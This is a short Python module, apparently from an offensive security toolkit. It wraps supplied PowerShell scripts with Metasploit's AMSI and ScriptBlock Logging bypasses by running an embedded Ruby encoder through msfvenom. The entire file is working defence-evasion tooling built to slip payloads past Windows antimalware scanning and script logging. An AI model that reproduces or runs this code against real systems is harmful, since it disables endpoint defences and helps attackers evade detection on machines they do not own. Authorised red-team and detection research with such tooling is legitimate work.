from lets.__module__ import Module


class Standard(Module):
    """
    Wrap a PowerShell script with standard AMSI and ScriptBlock Logging bypasses.
    """
    images = [
        "local/metasploit:1.0.0",   # amd64 only!
        ]

    @classmethod
    def add_arguments(self, parser):
        pass

    def handle(self, input, url=None):
        assert input is not None, "Must provide powershell as input"

        import lets.generate.payload.msfvenom as msfvenom

        for data in input:
            source = """
require 'rex/powershell'

class MetasploitModule < Msf::Encoder
    Rank = ManualRanking

    include Rex::Powershell::PshMethods

    def initialize
        super(
            'Arch'          => ARCH_ALL,
            'EncoderType'   => Msf::Encoder::Type::Unspecified)
    end

    def encode_block(state, block)
        bypass = Rex::Powershell::PshMethods.bypass_powershell_protections
        compressed = Rex::Powershell::Command.compress_script(block, nil, {})
        return "#{bypass};#{compressed}"
    end
end
"""

            yield msfvenom.run_custom_encoder(source, data)
